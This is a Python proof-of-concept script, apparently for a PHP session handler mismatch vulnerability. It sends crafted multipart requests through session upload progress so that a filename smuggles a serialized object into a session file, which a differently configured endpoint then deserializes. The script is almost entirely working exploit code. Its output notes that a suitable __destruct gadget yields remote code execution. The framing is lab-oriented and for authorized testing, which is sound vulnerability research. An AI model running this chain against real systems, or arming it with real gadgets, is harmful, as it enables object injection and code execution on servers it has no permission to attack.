#!/usr/bin/env python3
"""
CVE-2026-109618/109619 — Verify session handler mismatch → object injection.

Demonstrates:
  1. Session written in php_serialize format (via directory with .user.ini)
  2. Pipe | in filename preserved in php_serialize format
  3. php handler reads the session → splits at | → deserializes injected object
  4. __destruct fires even when decode returns FAILURE (trailing data)

Setup required:
  - /app/ directory with .user.ini: session.serialize_handler = php_serialize
  - /api/ directory with .user.ini: session.serialize_handler = php
  - Both share the same session.save_path

Usage:
  python3 verify_handler_mismatch.py --target http://127.0.0.1:18080

For authorized security testing only.
"""
import argparse
import socket
import sys
from urllib.parse import urlparse


def upload(host, port, path, sid, filename):
    boundary = "MISMATCH"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    # Cookie is required: rfc1867 alone does not persist a session file
    # for this lab when the endpoint does not call session_start().
    # Send both POST-body SID (fixation) and Cookie SID.
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/upload.php",
                    help="Endpoint with php_serialize handler")
    ap.add_argument("--read-path", default="/api/endpoint.php",
                    help="Endpoint with php handler")
    ap.add_argument("--sid", default="mismatchverify0000000000000")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618/109619 — Handler Mismatch Verification")
    print(f"[*] Target: {args.target}")
    print()

    # Step 1: Write session via php_serialize endpoint
    # Filename contains |O:8:"stdClass":0:{} (escaped quotes)
    gadget = 'x|O:8:\\"stdClass\\":0:{}'
    print(f"[1] Writing session via {args.write_path} (php_serialize)")
    print(f"    Filename payload: {gadget}")
    upload(host, port, args.write_path, args.sid, gadget)
    print("    → Session file written in php_serialize format")

    # Step 2: Trigger via php handler endpoint
    print(f"\n[2] Triggering mismatch via {args.read_path} (php handler)")
    print("    php handler scans for | → splits → deserializes O:8:\"stdClass\":0:{}")
    resp = upload(host, port, args.read_path, args.sid, "dummy")

    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Response: {status}")

    print()
    print("[*] Verification indicators:")
    print("    - 'Failed to decode session object' warning = mismatch triggered")
    print("    - 'Session object destruction failed' = __destruct fired on injected object")
    print("    - If target has a class with exploitable __destruct → RCE")
    print()
    print("[*] Check target for:")
    print(f"    - Session file: /tmp/sessions/sess_{args.sid}")
    print("    - Evidence of __destruct execution (file writes, network connections, etc.)")


if __name__ == "__main__":
    main()
